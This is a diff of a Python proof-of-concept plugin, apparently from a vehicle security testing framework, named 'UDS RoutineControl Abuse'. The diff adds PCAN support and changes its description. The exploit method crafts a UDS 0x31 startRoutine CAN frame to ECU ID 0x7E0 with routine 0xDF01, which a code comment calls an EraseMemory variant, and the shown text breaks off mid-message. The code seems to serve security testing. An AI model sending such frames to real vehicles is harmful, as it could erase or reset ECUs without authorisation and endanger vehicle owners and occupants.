@@ -1,24 +1,27 @@
 """
 PoC Name: UDS RoutineControl Abuse
 CVE: N/A
-Component: Canbus Stack
-Category: Canbus
+Component: UDS Protocol (ISO 14229)
+Category: Protocol
 Severity: Critical
 CVSS: 8.0
-Description: UDS 0x31服务未授权执行ECU例程(擦除/重置等)
-Prerequisites: SocketCAN接口, python-can库。
-Usage: python3 29_UDS_RoutineControl.py <can_interface>
+Description: 尝试UDS 0x31服务执行ECU例程(如擦除内存、重置等),检测访问控制。
+Prerequisites: PCAN接口, python-can库, PCAN驱动。
+Usage: python3 29_UDS_RoutineControl.py PCAN_USBBUS1
 """
 import sys
 from iv_plugin_base import IVIVulnerabilityPlugin
 class UDSRoutineControlPlugin(IVIVulnerabilityPlugin):
     def check_prerequisites(self): return True
     def exploit(self):
-        iface = self.params.get("can_interface", "can0")
+        iface = self.params.get("can_interface", "PCAN_USBBUS1")
         self.logger.info(f"UDS RoutineControl测试 ({iface})...")
         try:
             import can
-            bus = can.interface.Bus(channel=iface, bustype="socketcan")
+            if "PCAN" in iface:
+                bus = can.interface.Bus(channel=iface, interface="pcan", bitrate=500000)
+            else:
+                bus = can.interface.Bus(channel=iface, bustype="socketcan")
             # RoutineControl: startRoutine(0x01), routineID=0xDF01 (EraseMemory variant)
             msg = can.Message(arbitration_id=0x7E0,
                 data=[0x04, 0x31, 0x01, 0xDF, 0x01, 0x00, 0x00, 0x00],
